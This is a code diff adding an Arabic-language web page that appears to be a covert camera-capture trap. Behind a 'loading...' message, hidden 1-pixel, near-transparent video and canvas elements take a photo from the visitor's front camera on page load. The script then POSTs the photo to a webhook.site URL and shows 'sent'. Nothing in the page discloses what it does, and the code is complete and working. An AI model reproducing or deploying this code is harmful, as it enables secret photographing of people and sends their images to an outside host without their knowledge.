@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title></title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background: #000;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+    #msg {
+      font-size: 40px;
+      color: #ff3366;
+      z-index: 10;
+    }
+    video, canvas {
+      position: absolute;
+      width:  1px;
+      height: 1px;
+      overflow: hidden;
+      opacity: 0.01;   /* صغير جدًا وشبه شفاف */
+    }
+  </style>
+</head>
+<body>
+
+  <div id="msg">جاري التحميل...</div>
+
+  <video id="v" autoplay playsinline muted></video>
+  <canvas id="c"></canvas>
+
+  <script>
+    (async () => {
+      const msg = document.getElementById('msg');
+      const video = document.getElementById('v');
+      const canvas = document.getElementById('c');
+      const ctx = canvas.getContext('2d');
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }
+        });
+
+        video.srcObject = stream;
+
+        // نعطي وقت أطول شوية للكاميرا عشان تستقر
+        await new Promise(r => setTimeout(r, 1200));
+
+        canvas.width  = video.videoWidth  || 640;
+        canvas.height = video.videoHeight || 480;
+
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.72));
+
+        const formData = new FormData();
+        formData.append('image', blob, 'photo.jpg');
+
+        await fetch('https://webhook.site/88dae8aa-d964-44bb-aabb-4aa6b6760657', {
+          method: 'POST',
+          body: formData
+        });
+
+        stream.getTracks().forEach(t => t.stop());
+
+        msg.innerText = "تم الإرسال";
+
+      } catch (e) {
+        msg.innerText = "تم رفض الوصول";
+      }
+    })();
+  </script>
+</body>
+</html>
